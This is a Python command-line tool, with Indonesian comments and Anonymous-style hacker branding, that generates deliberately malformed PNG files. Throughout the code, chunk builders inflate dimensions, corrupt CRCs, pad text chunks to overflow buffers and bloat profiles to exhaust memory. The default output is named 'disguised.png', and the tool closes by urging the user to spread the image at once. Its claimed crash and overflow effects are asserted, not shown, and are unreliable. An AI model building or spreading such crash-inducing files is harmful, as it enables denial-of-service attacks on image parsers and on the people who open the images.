import struct
import zlib
import os
import random
import time
import sys
from typing import List, Dict, Callable
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table
from rich.prompt import Prompt, Confirm
import numpy as np

# Inisialisasi Rich Console untuk CLI modern
console = Console()

# ANSI color codes untuk estetika hacker
class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    PURPLE = "\033[95m"
    BOLD = "\033[1m"

def print_banner() -> None:
    """Menampilkan banner ASCII dengan nuansa hacker menggunakan Rich"""
    banner = f"""
{Colors.RED}{Colors.BOLD} ╔════════════════════════════════════════════╗
║      PNG CORRUPTOR v2.0 - GOD MODE         ║
║   Unleash Digital Chaos - By Machiavelli   ║
╚════════════════════════════════════════════╝{Colors.RESET}
"""
    console.print(Panel(banner, title="PNG Corruptor", style="cyan", border_style="purple"))
    console.print("[bold cyan][*] Selamat datang di alat penghancur PNG tercanggih.[/bold cyan]")
    console.print("[bold cyan][*] Pilih chunk untuk menciptakan kekacauan digital maksimal.[/bold cyan]")

def print_menu(chunk_options: List[str]) -> None:
    """Menampilkan menu interaktif dengan tabel Rich"""
    table = Table(title="Menu Korupsi PNG", style="purple")
    table.add_column("No", style="cyan", justify="center")
    table.add_column("Chunk", style="green")
    table.add_column("Deskripsi", style="yellow")
    
    chunk_descriptions = {
        "IHDR": "Header PNG, mengatur dimensi dan format",
        "PLTE": "Palet warna, untuk manipulasi warna rusak",
        "IDAT": "Data gambar, inti korupsi visual",
        "IEND": "Penutup PNG, sering untuk CRC rusak",
        "tRNS": "Transparansi, memicu error rendering",
        "cHRM": "Gamut warna, untuk distorsi warna",
        "gAMA": "Gamma, untuk manipulasi kecerahan",
        "iCCP": "Profil warna ICC, membebani memori",
        "sBIT": "Bit signifikan, untuk error parsing",
        "sRGB": "Ruang warna sRGB, untuk rendering cacat",
        "tEXt": "Teks, untuk buffer overflow",
        "zTXt": "Teks terkompresi, untuk crash parser",
        "iTXt": "Teks internasional, untuk encoding rusak",
        "bKGD": "Warna latar, untuk rendering salah",
        "pHYs": "Dimensi fisik, untuk DPI ekstrem",
        "sPLT": "Palet sugesti, untuk error parsing",
        "hIST": "Histogram, untuk crash parser",
        "tIME": "Waktu, untuk metadata tidak valid",
        "oFFs": "Offset, untuk posisi gambar salah",
        "pCAL": "Kalibrasi piksel, untuk error skala",
        "sCAL": "Skala fisik, untuk crash parser",
        "fRAc": "Data fraktal, untuk korupsi kompleks",
        "gIFg": "Data GIF usang, untuk kebingungan",
        "gIFt": "Teks GIF, untuk error parsing",
        "gIFx": "Ekstensi GIF, untuk data acak"
    }
    
    for i, chunk in enumerate(chunk_options, 1):
        table.add_row(str(i), chunk, chunk_descriptions.get(chunk, "Fungsi khusus"))
    
    console.print(table)
    console.print("\n[bold cyan]Catatan: IHDR, IDAT, IEND wajib untuk PNG valid, tetapi bisa dikorupsi.[/bold cyan]")
    console.print("[bold yellow]Masukkan nomor chunk (pisahkan dengan koma, kosongkan untuk default [IHDR, IDAT, IEND]):[/bold yellow]")

def print_anonymous_logo() -> None:
    """Menampilkan logo ASCII Anonymous"""
    logo = f"""
{Colors.RED}{Colors.BOLD}
       .-""""""""-.
     .'          '.
    /   ʕ ˵• ₒ •˵ ʔ  /
   :               ';
    : ,          : '
     `._         _.'
        '"''''''"'
{Colors.RESET}
{Colors.CYAN}[*] We are Anonymous. We are Legion. Expect us.[/bold cyan]
"""
    console.print(Panel(logo, title="Anonymous", style="red", border_style="purple"))

def create_ihdr_chunk(width: int = 8192, height: int = 8192) -> bytes:
    """Menyusun IHDR dengan dimensi ekstrem dan tipe warna acak"""
    color_types = [0, 2, 3, 4, 6]
    ihdr_data = struct.pack(">IIBBBBB", width, height, random.randint(1, 16), random.choice(color_types), 0, 0, 0)
    ihdr_chunk = b"IHDR" + ihdr_data
    ihdr_crc = zlib.crc32(ihdr_chunk) & 0xffffffff
    return struct.pack(">I", len(ihdr_data)) + ihdr_chunk + struct.pack(">I", ihdr_crc)

def create_plte_chunk() -> bytes:
    """Menyisipkan PLTE dengan palet acak dan ukuran tidak valid"""
    palette_size = random.randint(1, 256) * 3
    plte_data = bytes([random.randint(0, 255) for _ in range(palette_size)])
    plte_chunk = b"PLTE" + plte_data
    plte_crc = zlib.crc32(plte_chunk) & 0xffffffff
    return struct.pack(">I", len(plte_data)) + plte_chunk + struct.pack(">I", plte_crc)

def create_idat_chunk(compression_level: int = 9, data_size: int = 10000) -> bytes:
    """Menyusun IDAT dengan data acak besar dan kompresi ekstrem"""
    idat_data = bytearray(np.random.bytes(data_size)) + b"\x00\xff" * (data_size // 2)
    idat_compressed = zlib.compress(idat_data, level=compression_level)
    idat_chunk = b"IDAT" + idat_compressed
    idat_crc = zlib.crc32(idat_chunk) & 0xffffffff
    return struct.pack(">I", len(idat_compressed)) + idat_chunk + struct.pack(">I", idat_crc)

def create_iend_chunk() -> bytes:
    """Menyisipkan IEND dengan CRC rusak untuk mengecoh parser"""
    iend_chunk = b"IEND"
    iend_crc = (zlib.crc32(iend_chunk) & 0xffffffff) ^ 0xFFFFFFFF
    return struct.pack(">I", 0) + iend_chunk + struct.pack(">I", iend_crc)

def create_trns_chunk() -> bytes:
    """Menyusun tRNS dengan data ambigu untuk kebingungan maksimal"""
    trns_data = bytes([random.randint(0, 255) for _ in range(3)])
    trns_chunk = b"tRNS" + trns_data
    trns_crc = zlib.crc32(trns_chunk) & 0xffffffff
    return struct.pack(">I", len(trns_data)) + trns_chunk + struct.pack(">I", trns_crc)

def create_chrm_chunk() -> bytes:
    """Menyisipkan cHRM dengan nilai ekstrem untuk merusak gamut warna"""
    chrm_data = struct.pack(">IIIIIIII", 100000, 100000, 100000, 100000, 100000, 100000, 100000, 100000)
    chrm_chunk = b"cHRM" + chrm_data
    chrm_crc = zlib.crc32(chrm_chunk) & 0xffffffff
    return struct.pack(">I", len(chrm_data)) + chrm_chunk + struct.pack(">I", chrm_crc)

def create_gama_chunk() -> bytes:
    """Menyusun gAMA dengan nilai ekstrem untuk distorsi rendering"""
    gama_data = struct.pack(">I", 1000000)
    gama_chunk = b"gAMA" + gama_data
    gama_crc = zlib.crc32(gama_chunk) & 0xffffffff
    return struct.pack(">I", len(gama_data)) + gama_chunk + struct.pack(">I", gama_crc)

def create_iccp_chunk() -> bytes:
    """Menyisipkan iCCP dengan profil besar untuk membebani memori"""
    iccp_data = b"Profile\0" + np.random.bytes(10000)
    iccp_compressed = zlib.compress(iccp_data, level=9)
    iccp_chunk = b"iCCP" + iccp_compressed
    iccp_crc = zlib.crc32(iccp_chunk) & 0xffffffff
    return struct.pack(">I", len(iccp_compressed)) + iccp_chunk + struct.pack(">I", iccp_crc)

def create_sbit_chunk() -> bytes:
    """Menyusun sBIT dengan bit signifikan salah untuk error parsing"""
    sbit_data = b"\xFF\xFF\xFF"
    sbit_chunk = b"sBIT" + sbit_data
    sbit_crc = zlib.crc32(sbit_chunk) & 0xffffffff
    return struct.pack(">I", len(sbit_data)) + sbit_chunk + struct.pack(">I", sbit_crc)

def create_srgb_chunk() -> bytes:
    """Menyisipkan sRGB dengan intent tidak valid untuk kebingungan parser"""
    srgb_data = b"\xFF"
    srgb_chunk = b"sRGB" + srgb_data
    srgb_crc = zlib.crc32(srgb_chunk) & 0xffffffff
    return struct.pack(">I", len(srgb_data)) + srgb_chunk + struct.pack(">I", srgb_crc)

def create_text_chunk() -> bytes:
    """Menyusun tEXt dengan data besar untuk memenuhi buffer"""
    text_data = b"Comment\0" + b"A" * 100000
    text_chunk = b"tEXt" + text_data
    text_crc = zlib.crc32(text_chunk) & 0xffffffff
    return struct.pack(">I", len(text_data)) + text_chunk + struct.pack(">I", text_crc)

def create_ztxt_chunk() -> bytes:
    """Menyisipkan zTXt dengan data terkompresi rusak"""
    ztxt_data = b"Comment\0" + zlib.compress(b"B" * 5000, level=1)
    ztxt_chunk = b"zTXt" + ztxt_data
    ztxt_crc = zlib.crc32(ztxt_chunk) & 0xffffffff
    return struct.pack(">I", len(ztxt_data)) + ztxt_chunk + struct.pack(">I", ztxt_crc)

def create_itxt_chunk() -> bytes:
    """Menyusun iTXt dengan encoding rusak untuk crash parser"""
    itxt_data = b"Comment\0\x00\x00\x00\x00" + "Invalid UTF-8 \xFF\xFE".encode()
    itxt_chunk = b"iTXt" + itxt_data
    itxt_crc = zlib.crc32(itxt_chunk) & 0xffffffff
    return struct.pack(">I", len(itxt_data)) + itxt_chunk + struct.pack(">I", itxt_crc)

def create_bkgd_chunk() -> bytes:
    """Menyisipkan bKGD dengan warna salah untuk rendering cacat"""
    bkgd_data = b"\xFF\xFF\xFF"
    bkgd_chunk = b"bKGD" + bkgd_data
    bkgd_crc = zlib.crc32(bkgd_chunk) & 0xffffffff
    return struct.pack(">I", len(bkgd_data)) + bkgd_chunk + struct.pack(">I", bkgd_crc)

def create_phys_chunk() -> bytes:
    """Menyusun pHYs dengan dpi ekstrem untuk kebingungan"""
    phys_data = struct.pack(">IIB", 1000000, 1000000, 1)
    phys_chunk = b"pHYs" + phys_data
    phys_crc = zlib.crc32(phys_chunk) & 0xffffffff
    return struct.pack(">I", len(phys_data)) + phys_chunk + struct.pack(">I", phys_crc)

def create_splt_chunk() -> bytes:
    """Menyisipkan sPLT dengan palet rusak untuk error parsing"""
    splt_data = b"Palette\0" + b"\xFF\x00\x00\x00" * 128
    splt_chunk = b"sPLT" + splt_data
    splt_crc = zlib.crc32(splt_chunk) & 0xffffffff
    return struct.pack(">I", len(splt_data)) + splt_chunk + struct.pack(">I", splt_crc)

def create_hist_chunk() -> bytes:
    """Menyusun hIST dengan data tidak sesuai untuk crash"""
    hist_data = b"\xFF\xFF" * 256
    hist_chunk = b"hIST" + hist_data
    hist_crc = zlib.crc32(hist_chunk) & 0xffffffff
    return struct.pack(">I", len(hist_data)) + hist_chunk + struct.pack(">I", hist_crc)

def create_time_chunk() -> bytes:
    """Menyisipkan tIME dengan waktu acak atau tidak valid"""
    year = random.randint(-1000, 9999)
    time_data = struct.pack(">HBBBBBB", year, 0, 0, 0, 0, 0, 0)
    time_chunk = b"tIME" + time_data
    time_crc = zlib.crc32(time_chunk) & 0xffffffff
    return struct.pack(">I", len(time_data)) + time_chunk + struct.pack(">I", time_crc)

def create_offs_chunk() -> bytes:
    """Menyusun oFFs dengan offset negatif untuk error"""
    offs_data = struct.pack(">iib", -1000, -1000, 1)
    offs_chunk = b"oFFs" + offs_data
    offs_crc = zlib.crc32(offs_chunk) & 0xffffffff
    return struct.pack(">I", len(offs_data)) + offs_chunk + struct.pack(">I", offs_crc)

def create_pcal_chunk() -> bytes:
    """Menyisipkan pCAL dengan kalibrasi tidak valid"""
    pcal_data = b"Calibration\0" + struct.pack(">iiBB", -1000, 1000, 0, 0)
    pcal_chunk = b"pCAL" + pcal_data
    pcal_crc = zlib.crc32(pcal_chunk) & 0xffffffff
    return struct.pack(">I", len(pcal_data)) + pcal_chunk + struct.pack(">I", pcal_crc)

def create_scal_chunk() -> bytes:
    """Menyusun sCAL dengan skala tidak valid untuk crash"""
    scal_data = b"\x00" + b"1e100"
    scal_chunk = b"sCAL" + scal_data
    scal_crc = zlib.crc32(scal_chunk) & 0xffffffff
    return struct.pack(">I", len(scal_data)) + scal_chunk + struct.pack(">I", scal_crc)

def create_frac_chunk() -> bytes:
    """Menyisipkan fRAc dengan data fraktal kompleks"""
    frac_data = np.random.bytes(5000)
    frac_chunk = b"fRAc" + frac_data
    frac_crc = zlib.crc32(frac_chunk) & 0xffffffff
    return struct.pack(">I", len(frac_data)) + frac_chunk + struct.pack(">I", frac_crc)

def create_gifg_chunk() -> bytes:
    """Menyusun gIFg dengan data GIF usang"""
    gifg_data = b"\x00\x00\x00\x00"
    gifg_chunk = b"gIFg" + gifg_data
    gifg_crc = zlib.crc32(gifg_chunk) & 0xffffffff
    return struct.pack(">I", len(gifg_data)) + gifg_chunk + struct.pack(">I", gifg_crc)

def create_gift_chunk() -> bytes:
    """Menyisipkan gIFt dengan teks rusak"""
    gift_data = b"Invalid GIF text"
    gift_chunk = b"gIFt" + gift_data
    gift_crc = zlib.crc32(gift_chunk) & 0xffffffff
    return struct.pack(">I", len(gift_data)) + gift_chunk + struct.pack(">I", gift_crc)

def create_gifx_chunk() -> bytes:
    """Menyusun gIFx dengan ekstensi acak"""
    gifx_data = np.random.bytes(1000)
    gifx_chunk = b"gIFx" + gifx_data
    gifx_crc = zlib.crc32(gifx_chunk) & 0xffffffff
    return struct.pack(">I", len(gifx_data)) + gifx_chunk + struct.pack(">I", gifx_crc)

def create_corrupt_png(filename: str, selected_chunks: List[str], compression_level: int, data_size: int) -> None:
    """Menciptakan file PNG korup dengan chunk terpilih dan animasi progress"""
    png_header = b"\x89PNG\r\n\x1a\n"
    chunks = []
    chunk_functions: Dict[str, Callable[..., bytes]] = {
        "IHDR": lambda: create_ihdr_chunk(random.randint(4096, 16384), random.randint(4096, 16384)),
        "PLTE": create_plte_chunk,
        "IDAT": lambda: create_idat_chunk(compression_level, data_size),
        "IEND": create_iend_chunk,
        "tRNS": create_trns_chunk,
        "cHRM": create_chrm_chunk,
        "gAMA": create_gama_chunk,
        "iCCP": create_iccp_chunk,
        "sBIT": create_sbit_chunk,
        "sRGB": create_srgb_chunk,
        "tEXt": create_text_chunk,
        "zTXt": create_ztxt_chunk,
        "iTXt": create_itxt_chunk,
        "bKGD": create_bkgd_chunk,
        "pHYs": create_phys_chunk,
        "sPLT": create_splt_chunk,
        "hIST": create_hist_chunk,
        "tIME": create_time_chunk,
        "oFFs": create_offs_chunk,
        "pCAL": create_pcal_chunk,
        "sCAL": create_scal_chunk,
        "fRAc": create_frac_chunk,
        "gIFg": create_gifg_chunk,
        "gIFt": create_gift_chunk,
        "gIFx": create_gifx_chunk
    }

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console) as progress:
        task = progress.add_task("[cyan]Menciptakan file PNG korup...", total=len(selected_chunks) + 1)
        
        if "IHDR" in selected_chunks:
            chunks.append(chunk_functions["IHDR"]())
            progress.update(task, advance=1)
        
        for chunk_type in selected_chunks:
            if chunk_type not in ["IHDR", "IDAT", "IEND"]:
                chunks.append(chunk_functions[chunk_type]())
                progress.update(task, advance=1)
        
        if "IDAT" in selected_chunks:
            chunks.append(chunk_functions["IDAT"]())
            progress.update(task, advance=1)
        
        if "IEND" in selected_chunks:
            chunks.append(chunk_functions["IEND"]())
            progress.update(task, advance=1)
        
        with open(filename, "wb") as f:
            f.write(png_header + b"".join(chunks))
    
    console.print(f"[bold green][+] File '{filename}' berhasil dibuat dengan chunk: {', '.join(selected_chunks)}[/bold green]")
    console.print(Panel("[bold red][!] Sebarkan gambar itu segera![/bold red]", style="red", border_style="yellow"))

def main_menu() -> None:
    """Menjalankan menu utama dengan antarmuka interaktif modern"""
    chunk_options = [
        "IHDR", "PLTE", "IDAT", "IEND", "tRNS", "cHRM", "gAMA", "iCCP", "sBIT", "sRGB",
        "tEXt", "zTXt", "iTXt", "bKGD", "pHYs", "sPLT", "hIST", "tIME", "oFFs", "pCAL",
        "sCAL", "fRAc", "gIFg", "gIFt", "gIFx"
    ]
    
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print_banner()
        print_menu(chunk_options)
        
        user_input = Prompt.ask("[bold yellow]>> Pilih nomor chunk (pisahkan dengan koma, kosongkan untuk default)[/bold yellow]")
        selected_chunks = ["IHDR", "IDAT", "IEND"] if not user_input.strip() else []
        
        if user_input.strip():
            try:
                indices = [int(i.strip()) - 1 for i in user_input.split(",")]
                selected_chunks = [chunk_options[i] for i in indices if 0 <= i < len(chunk_options)]
                invalid_indices = [i for i in indices if i < 0 or i >= len(chunk_options)]
                if invalid_indices:
                    console.print(f"[bold red][-] Nomor tidak valid: {', '.join(map(str, [i+1 for i in invalid_indices]))}. Menggunakan default.[/bold red]")
                    selected_chunks = ["IHDR", "IDAT", "IEND"]
            except ValueError:
                console.print("[bold red][-] Input tidak valid. Menggunakan default.[/bold red]")
                selected_chunks = ["IHDR", "IDAT", "IEND"]
        
        filename = Prompt.ask("[bold yellow]>> Masukkan nama file (default: disguised.png)[/bold yellow]", default="disguised.png")
        compression_level = int(Prompt.ask("[bold yellow]>> Masukkan level kompresi (0-9, default: 9)[/bold yellow]", default="9"))
        data_size = int(Prompt.ask("[bold yellow]>> Masukkan ukuran data IDAT (default: 10000)[/bold yellow]", default="10000"))
        
        # Autentikasi ID Cyber
        cyber_id = Prompt.ask("[bold yellow]>> Masukkan ID Cyber Anda[/bold yellow]")
        if cyber_id != "503rexsec":
            console.print("[bold red][-] ID Cyber salah. Akses ditolak.[/bold red]")
            return
        
        # Autentikasi Konfigurasi Server
        server_config = Prompt.ask("[bold yellow]>> Masukkan konfigurasi server[/bold yellow]")
        if server_config != "anonymousrex503":
            console.print("[bold red][-] Konfigurasi server salah. Akses ditolak.[/bold red]")
            return
        
        # Tampilkan logo Anonymous
        print_anonymous_logo()
        
        # Animasi loading
        with Progress(SpinnerColumn(), TextColumn("[cyan]Memproses autentikasi dan memulai pembuatan file...[/cyan]"), console=console) as progress:
            task = progress.add_task("", total=100)
            for _ in range(100):
                time.sleep(0.03)
                progress.update(task, advance=1)
        
        console.print("[bold cyan][*] Menciptakan file PNG korup...[/bold cyan]")
        create_corrupt_png(filename, selected_chunks, compression_level, data_size)
        
        if not Confirm.ask("[bold yellow]>> Buat file lain?[/bold yellow]"):
            console.print("[bold purple][*] Keluar dari sistem. Chaos selesai.[/bold purple]")
            break

if __name__ == "__main__":
    main_menu()
